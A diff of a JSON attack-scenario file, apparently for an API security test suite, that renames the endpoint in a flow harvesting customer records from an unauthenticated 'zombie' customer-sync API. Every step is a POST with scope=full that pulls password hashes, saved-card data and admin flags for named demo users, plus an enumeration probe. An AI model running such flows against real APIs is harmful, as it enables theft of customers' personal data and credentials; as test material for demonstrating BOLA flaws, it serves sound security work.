@@ -1,7 +1,7 @@
 {
   "id": "flow_zombie_customer_sync_data_harvest",
   "name": "Attack: Zombie Customer-Sync Export Data Harvest",
-  "description": "An anonymous actor who discovered the decommissioned /internal/customer-sync backend enumerates customer references (by username, email, and user_id) with scope=full - no auth, no ownership check - to harvest full customer records: PII, mailing addresses, saved-card metadata, credential hashes, and internal-only fields (tax_id, lifetime_value, risk notes). Demonstrates BOLA + excessive data exposure on an off-schema zombie API.",
+  "description": "An anonymous actor who discovered the decommissioned /api/v1/customer-sync backend enumerates customer references (by username, email, and user_id) with scope=full - no auth, no ownership check - to harvest full customer records: PII, mailing addresses, saved-card metadata, credential hashes, and internal-only fields (tax_id, lifetime_value, risk notes). Demonstrates BOLA + excessive data exposure on an off-schema zombie API.",
   "headers": {
     "Accept": "application/json",
     "Content-Type": "application/json"
@@ -23,7 +23,7 @@
       "name": "Harvest: AliceSmith (scope=full)",
       "type": "request",
       "method": "POST",
-      "url": "{{baseUrl}}/internal/customer-sync",
+      "url": "{{baseUrl}}/api/v1/customer-sync",
       "body": { "account_ref": "{{refAlice}}", "scope": "full" },
       "extract": {
         "alice_pwd_hash": "body.password_hash",
@@ -36,7 +36,7 @@
       "name": "Harvest: BobJohnson (scope=full)",
       "type": "request",
       "method": "POST",
-      "url": "{{baseUrl}}/internal/customer-sync",
+      "url": "{{baseUrl}}/api/v1/customer-sync",
       "body": { "account_ref": "{{refBob}}", "scope": "full" },
       "extract": { "bob_cards": "body.payment_methods" },
       "onFailure": "continue"
@@ -46,7 +46,7 @@
       "name": "Harvest: CarolWhite (scope=full)",
       "type": "request",
       "method": "POST",
-      "url": "{{baseUrl}}/internal/customer-sync",
+      "url": "{{baseUrl}}/api/v1/customer-sync",
       "body": { "account_ref": "{{refCarol}}", "scope": "full" },
       "onFailure": "continue"
     },
@@ -55,7 +55,7 @@
       "name": "Harvest by email: DavidBrown (scope=full)",
       "type": "request",
       "method": "POST",
-      "url": "{{baseUrl}}/internal/customer-sync",
+      "url": "{{baseUrl}}/api/v1/customer-sync",
       "body": { "account_ref": "{{refDavidEmail}}", "scope": "full" },
       "onFailure": "continue"
     },
@@ -64,7 +64,7 @@
       "name": "Harvest by email: EveDavis (scope=full)",
       "type": "request",
       "method": "POST",
-      "url": "{{baseUrl}}/internal/customer-sync",
+      "url": "{{baseUrl}}/api/v1/customer-sync",
       "body": { "account_ref": "{{refEveEmail}}", "scope": "full" },
       "onFailure": "continue"
     },
@@ -73,7 +73,7 @@
       "name": "Harvest: QuinnBaker (scope=full)",
       "type": "request",
       "method": "POST",
-      "url": "{{baseUrl}}/internal/customer-sync",
+      "url": "{{baseUrl}}/api/v1/customer-sync",
       "body": { "account_ref": "{{refQuinn}}", "scope": "full" },
       "onFailure": "continue"
     },
@@ -82,7 +82,7 @@
       "name": "Harvest: admin superuser (scope=full)",
       "type": "request",
       "method": "POST",
-      "url": "{{baseUrl}}/internal/customer-sync",
+      "url": "{{baseUrl}}/api/v1/customer-sync",
       "body": { "account_ref": "{{refAdmin}}", "scope": "full" },
       "extract": { "admin_is_admin": "body.is_admin" },
       "onFailure": "continue"
@@ -92,7 +92,7 @@
       "name": "Enumeration probe: unknown reference (expect 404)",
       "type": "request",
       "method": "POST",
-      "url": "{{baseUrl}}/internal/customer-sync",
+      "url": "{{baseUrl}}/api/v1/customer-sync",
       "body": { "account_ref": "{{refNotFound}}", "scope": "full" },
       "onFailure": "continue"
     }
